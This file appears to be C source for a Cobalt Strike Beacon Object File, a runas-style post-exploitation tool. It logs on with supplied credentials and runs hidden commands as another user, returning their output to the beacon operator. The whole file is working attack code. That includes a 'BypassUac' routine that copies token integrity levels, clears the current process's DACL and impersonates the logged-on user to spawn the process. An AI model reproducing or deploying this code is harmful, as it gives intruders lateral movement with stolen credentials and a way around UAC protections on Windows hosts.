#include <windows.h>
#include "beacon.h"

#define LOGON_WITH_PROFILE          0x00000001
#define LOGON_NETCREDENTIALS_ONLY   0x00000002
#define CREATE_NO_WINDOW            0x08000000
#define CREATE_UNICODE_ENVIRONMENT  0x00000400
#define STARTF_USESTDHANDLES        0x00000100
#define BUFFER_SIZE_PIPE            1048576
#define PROCESS_TIMEOUT             120000

#define SE_KERNEL_OBJECT            6
#define DACL_SECURITY_INFORMATION   0x00000004

#define SECURITY_MANDATORY_MEDIUM_RID   0x2000
#define SE_GROUP_INTEGRITY              0x00000020

WINBASEAPI WINBOOL WINAPI ADVAPI32$LogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);
WINADVAPI  WINBOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
WINADVAPI  WINBOOL WINAPI ADVAPI32$SetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI BOOL    WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI DWORD   WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI BOOL    WINAPI KERNEL32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
WINBASEAPI BOOL    WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL    WINAPI KERNEL32$SetNamedPipeHandleState(HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout);
WINBASEAPI BOOL    WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI BOOL    WINAPI KERNEL32$PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
WINADVAPI  WINBOOL WINAPI ADVAPI32$CreateProcessWithLogonW(LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
WINADVAPI  WINBOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
WINADVAPI  WINBOOL WINAPI ADVAPI32$RevertToSelf(VOID);
WINADVAPI  DWORD   WINAPI ADVAPI32$SetSecurityInfo(HANDLE handle, DWORD ObjectType, DWORD SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
WINADVAPI  WINBOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI  WINBOOL WINAPI ADVAPI32$AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1, DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6, DWORD dwSubAuthority7, PSID* pSid);
WINADVAPI  PVOID   WINAPI ADVAPI32$FreeSid(PSID pSid);
WINADVAPI  PDWORD  WINAPI ADVAPI32$GetSidSubAuthority(PSID pSid, DWORD nSubAuthority);
WINADVAPI  PUCHAR  WINAPI ADVAPI32$GetSidSubAuthorityCount(PSID pSid);
WINADVAPI  DWORD   WINAPI ADVAPI32$GetLengthSid(PSID pSid);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetCurrentThread(VOID);
WINADVAPI  WINBOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
WINADVAPI  WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);

void _memset(void* ptr, int value, size_t num) {
    if (!ptr) return;
    unsigned char* p = (unsigned char*)ptr;
    while (num--) *p++ = (unsigned char)value;
}

const char* GetLogonTypeName(DWORD logonType)
{
    switch (logonType) {
        case 2:  return "Interactive";
        case 3:  return "Network";
        case 4:  return "Batch";
        case 5:  return "Service";
        case 8:  return "NetworkCleartext";
        case 9:  return "NewCredentials";
        default: return "Unknown";
    }
}

BOOL CreateAnonymousPipe(PHANDLE hReadPipe, PHANDLE hWritePipe)
{
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    return KERNEL32$CreatePipe(hReadPipe, hWritePipe, &sa, BUFFER_SIZE_PIPE);
}

DWORD GetTokenIntegrityLevel(HANDLE hToken)
{
    DWORD integrityLevel = 0;
    DWORD dwLength = 0;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;

    ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength);
    if (dwLength == 0) return 0;

    pTIL = (PTOKEN_MANDATORY_LABEL)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
    if (!pTIL) return 0;

    if (ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLength, &dwLength)) {
        PUCHAR pCount = ADVAPI32$GetSidSubAuthorityCount(pTIL->Label.Sid);
        if (pCount && *pCount > 0) {
            PDWORD pRid = ADVAPI32$GetSidSubAuthority(pTIL->Label.Sid, (*pCount) - 1);
            if (pRid) integrityLevel = *pRid;
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTIL);
    return integrityLevel;
}

BOOL SetTokenIntegrityLevel(HANDLE hToken, DWORD integrityLevel)
{
    SID_IDENTIFIER_AUTHORITY MLAuthority = { {0, 0, 0, 0, 0, 16} };
    PSID pIntegritySid = NULL;
    TOKEN_MANDATORY_LABEL tml;
    BOOL result = FALSE;

    if (!ADVAPI32$AllocateAndInitializeSid(&MLAuthority, 1, integrityLevel, 0, 0, 0, 0, 0, 0, 0, &pIntegritySid))
        return FALSE;

    _memset(&tml, 0, sizeof(tml));
    tml.Label.Sid = pIntegritySid;
    tml.Label.Attributes = SE_GROUP_INTEGRITY;

    result = ADVAPI32$SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(TOKEN_MANDATORY_LABEL));

    ADVAPI32$FreeSid(pIntegritySid);
    return result;
}

BOOL CreateProcessWithLogonWBypassUac(LPCWSTR username, LPCWSTR domain, LPCWSTR password, DWORD logonType, LPWSTR cmdLine, LPSTARTUPINFOW si, LPPROCESS_INFORMATION pi)
{
    HANDLE hToken = NULL;
    HANDLE hCurrentProcessToken = NULL;
    BOOL result = FALSE;

    if (!ADVAPI32$LogonUserW(username, domain, password, logonType, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "BypassUac: LogonUser failed. Error: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hCurrentProcessToken)) {
        DWORD currentIL = GetTokenIntegrityLevel(hCurrentProcessToken);
        SetTokenIntegrityLevel(hToken, currentIL);
        KERNEL32$CloseHandle(hCurrentProcessToken);
    }

    ADVAPI32$SetSecurityInfo(KERNEL32$GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);

    if (ADVAPI32$ImpersonateLoggedOnUser(hToken)) {
        LPCWSTR effectiveDomain = domain;
        WCHAR dotDomain[] = L".";
        if (!domain || domain[0] == L'\0')
            effectiveDomain = dotDomain;

        WCHAR currentDir[] = L"C:\\Windows\\System32";
        result = ADVAPI32$CreateProcessWithLogonW(username, effectiveDomain, password, LOGON_NETCREDENTIALS_ONLY, NULL, cmdLine, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir, si, pi);
        
        if (!result)
            BeaconPrintf(CALLBACK_ERROR, "BypassUac: CreateProcessWithLogonW failed. Error: %d\n", KERNEL32$GetLastError());
        
        ADVAPI32$RevertToSelf();
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "BypassUac: ImpersonateLoggedOnUser failed. Error: %d\n", KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(hToken);
    return result;
}

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    
    ULONG  cmdLen      = 0;
    WCHAR* username    = (WCHAR*)BeaconDataExtract(&parser, NULL);
    WCHAR* password    = (WCHAR*)BeaconDataExtract(&parser, NULL);
    WCHAR* domain      = (WCHAR*)BeaconDataExtract(&parser, NULL);
    WCHAR* commandLine = (WCHAR*)BeaconDataExtract(&parser, &cmdLen);
    ULONG  logonType   = BeaconDataInt(&parser);
    ULONG  timeout     = BeaconDataInt(&parser);
    ULONG  noOutput    = BeaconDataInt(&parser);
    ULONG  bypassUac   = BeaconDataInt(&parser);

    if (!username || !password || !domain) {
        BeaconPrintf(CALLBACK_ERROR, "Missing required parameters: username, password, or domain\n");
        return;
    }

    if (!commandLine || cmdLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Missing required parameter: commandLine\n");
        return;
    }

    DWORD logonFlags = LOGON_WITH_PROFILE;
    if (logonType == 9)
        logonFlags = LOGON_NETCREDENTIALS_ONLY;
    else if (logonType < 2 || logonType > 9 || logonType == 6 || logonType == 7)
        logonType = 2;

    HANDLE hOutputReadTmp = NULL;
    HANDLE hOutputWrite = NULL;
    HANDLE hErrorWrite = NULL;
    HANDLE hOutputRead = NULL;
    HANDLE hCurrentProcess = KERNEL32$GetCurrentProcess();

    if (!noOutput) {
        if (!CreateAnonymousPipe(&hOutputReadTmp, &hOutputWrite)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe for stdout failed. Error: %d\n", KERNEL32$GetLastError());
            return;
        }

        if (!KERNEL32$DuplicateHandle(hCurrentProcess, hOutputWrite, hCurrentProcess, &hErrorWrite, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
            BeaconPrintf(CALLBACK_ERROR, "DuplicateHandle for stderr failed. Error: %d\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hOutputReadTmp);
            KERNEL32$CloseHandle(hOutputWrite);
            return;
        }

        if (!KERNEL32$DuplicateHandle(hCurrentProcess, hOutputReadTmp, hCurrentProcess, &hOutputRead, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            BeaconPrintf(CALLBACK_ERROR, "DuplicateHandle for stdout read failed. Error: %d\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hOutputReadTmp);
            KERNEL32$CloseHandle(hOutputWrite);
            KERNEL32$CloseHandle(hErrorWrite);
            return;
        }
        KERNEL32$CloseHandle(hOutputReadTmp);
        hOutputReadTmp = NULL;

        DWORD pipeMode = PIPE_NOWAIT;
        KERNEL32$SetNamedPipeHandleState(hOutputRead, &pipeMode, NULL, NULL);
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    _memset(&si, 0, sizeof(si));
    _memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    
    if (!noOutput) {
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = NULL;
        si.hStdOutput = hOutputWrite;
        si.hStdError = hErrorWrite;
    }

    WCHAR* cmdLineCopy = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (cmdLen + 2) * sizeof(WCHAR));
    if (!cmdLineCopy) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for command line\n");
        if (!noOutput) {
            KERNEL32$CloseHandle(hOutputRead);
            KERNEL32$CloseHandle(hOutputWrite);
            KERNEL32$CloseHandle(hErrorWrite);
        }
        return;
    }
    
    for (ULONG i = 0; i < cmdLen / sizeof(WCHAR); i++)
        cmdLineCopy[i] = commandLine[i];

    BOOL processCreated = FALSE;

    WCHAR currentDir[] = L"C:\\Windows\\System32";

    if (bypassUac) {
        DWORD logonTypeBypassUac = logonType;
        if (logonType != 3 && logonType != 4 && logonType != 5 && logonType != 8)
            logonTypeBypassUac = 8;
        processCreated = CreateProcessWithLogonWBypassUac(username, domain, password, logonTypeBypassUac, cmdLineCopy, &si, &pi);
    }
    else {
        processCreated = ADVAPI32$CreateProcessWithLogonW(username, domain, password, logonFlags, NULL, cmdLineCopy, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir, &si, &pi);
    }

    if (!noOutput) {
        KERNEL32$CloseHandle(hOutputWrite);
        KERNEL32$CloseHandle(hErrorWrite);
        hOutputWrite = NULL;
        hErrorWrite = NULL;
    }

    if (!processCreated) {
        DWORD error = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithLogonW failed. Error: %d\n", error);
        if (!noOutput) KERNEL32$CloseHandle(hOutputRead);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, cmdLineCopy);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created (PID: %d) as %ls\\%ls (logon: %s)%s\n", pi.dwProcessId, domain, username, GetLogonTypeName(logonType), bypassUac ? " [bypass-uac]" : "");

    if (!noOutput) {
        DWORD waitTime = (timeout > 0) ? timeout : PROCESS_TIMEOUT;
        KERNEL32$WaitForSingleObject(pi.hProcess, waitTime);

        char* outputBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE_PIPE);
        if (outputBuffer) {
            DWORD totalBytesRead = 0;
            DWORD bytesRead = 0;
            DWORD bytesAvail = 0;

            while (KERNEL32$PeekNamedPipe(hOutputRead, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
                DWORD toRead = (bytesAvail > (BUFFER_SIZE_PIPE - totalBytesRead - 1)) ? (BUFFER_SIZE_PIPE - totalBytesRead - 1) : bytesAvail;
                if (toRead == 0)
                    break;
                if (KERNEL32$ReadFile(hOutputRead, outputBuffer + totalBytesRead, toRead, &bytesRead, NULL))
                    totalBytesRead += bytesRead;
                else
                    break;
            }

            if (totalBytesRead > 0) {
                outputBuffer[totalBytesRead] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT_OEM, "\n--- Process Output ---\n%s\n--- End Output ---\n", outputBuffer);
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] No output captured from the process.\n");
            }

            _memset(outputBuffer, 0, BUFFER_SIZE_PIPE);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, outputBuffer);
        }

        KERNEL32$CloseHandle(hOutputRead);
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    
    _memset(cmdLineCopy, 0, (cmdLen + 2) * sizeof(WCHAR));
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, cmdLineCopy);
}